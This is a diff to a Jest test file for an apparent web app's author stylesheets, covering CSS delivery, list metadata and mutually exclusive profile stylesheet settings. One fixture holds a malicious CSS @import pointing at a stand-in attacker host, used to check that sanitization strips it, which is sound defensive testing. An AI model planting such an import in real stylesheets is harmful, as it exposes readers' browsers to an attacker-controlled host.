@@ -2,9 +2,12 @@ import { truncateAll, seedDefaults, testPrisma } from '../test/dbHelpers';
 import {
   createAuthorStylesheet,
   listAuthorStylesheets,
+  getAuthorStylesheetCss,
   adoptAuthorStylesheet
 } from '../modules/authorStylesheet';
 import { getReputation } from '../modules/reputation';
+import { updateProfile } from '../modules/profile';
+import { AppError } from '../lib/errors';
 
 beforeEach(async () => {
   await truncateAll();
@@ -51,6 +54,104 @@ describe('AuthorStylesheet save → list (PRD-03 #118, many per author)', () => 
     const all = await listAuthorStylesheets(author.id);
     expect(all).toHaveLength(2);
     expect(all.map((s) => s.name)).toEqual(['First', 'Second']);
+    // ADR-0024 §1 — a list payload carries metadata only; source stays behind
+    // the per-id /css delivery route, never a JSON list.
+    expect(all[0]).not.toHaveProperty('source');
+  });
+});
+
+describe('AuthorStylesheet CSS delivery (ADR-0024 §1)', () => {
+  it('serves the stored sanitized source; a bad @import is stripped before delivery', async () => {
+    const author = await createUser();
+    // Raw source with an exfiltration vector; store-time cssSanitize neutralizes
+    // it, and the /css read hands back the already-safe stored artifact.
+    const sheet = await createAuthorStylesheet(author.id, {
+      name: 'Anorex',
+      source: "@import url('http://evil.example/x.css'); body { color: #0f0; }"
+    });
+
+    const delivered = await getAuthorStylesheetCss(sheet.id);
+    expect(delivered).not.toBeNull();
+    expect(delivered!.source).toContain('color: #0f0');
+    expect(delivered!.source).not.toContain('@import');
+    expect(delivered!.source).not.toContain('evil.example');
+  });
+
+  it('returns null for a non-existent sheet (the route maps this to 404)', async () => {
+    expect(await getAuthorStylesheetCss(999999)).toBeNull();
+  });
+});
+
+describe('Site Stylesheet radio — Personal ⟷ Registry mutual exclusion (ADR-0024 §4)', () => {
+  it('selecting Registry (pointer) clears a previously-set Personal URL', async () => {
+    const author = await createUser();
+    const member = await createUser();
+    const sheet = await createAuthorStylesheet(author.id, {
+      name: 'Reg',
+      source: 'a {}'
+    });
+
+    await updateProfile(member.id, {
+      externalStylesheet: 'https://cdn.example.com/mine.css'
+    });
+    await updateProfile(member.id, { activeAuthorStylesheetId: sheet.id });
+
+    const settings = await testPrisma.user
+      .findUniqueOrThrow({
+        where: { id: member.id },
+        select: { userSettings: true }
+      })
+      .then((u) => u.userSettings);
+    expect(settings.activeAuthorStylesheetId).toBe(sheet.id);
+    expect(settings.externalStylesheet).toBeNull();
+  });
+
+  it('selecting Personal (URL) clears a previously-set Registry pointer', async () => {
+    const author = await createUser();
+    const member = await createUser();
+    const sheet = await createAuthorStylesheet(author.id, {
+      name: 'Reg',
+      source: 'a {}'
+    });
+
+    await updateProfile(member.id, { activeAuthorStylesheetId: sheet.id });
+    await updateProfile(member.id, {
+      externalStylesheet: 'https://cdn.example.com/mine.css'
+    });
+
+    const settings = await testPrisma.user
+      .findUniqueOrThrow({
+        where: { id: member.id },
+        select: { userSettings: true }
+      })
+      .then((u) => u.userSettings);
+    expect(settings.externalStylesheet).toBe(
+      'https://cdn.example.com/mine.css'
+    );
+    expect(settings.activeAuthorStylesheetId).toBeNull();
+  });
+
+  it('rejects setting both sources in one write (400)', async () => {
+    const author = await createUser();
+    const member = await createUser();
+    const sheet = await createAuthorStylesheet(author.id, {
+      name: 'Reg',
+      source: 'a {}'
+    });
+
+    await expect(
+      updateProfile(member.id, {
+        externalStylesheet: 'https://cdn.example.com/mine.css',
+        activeAuthorStylesheetId: sheet.id
+      })
+    ).rejects.toMatchObject({ statusCode: 400 });
+  });
+
+  it('rejects a pointer at a non-existent sheet (400) — clean, not a raw FK 500', async () => {
+    const member = await createUser();
+    await expect(
+      updateProfile(member.id, { activeAuthorStylesheetId: 999999 })
+    ).rejects.toBeInstanceOf(AppError);
   });
 });
 
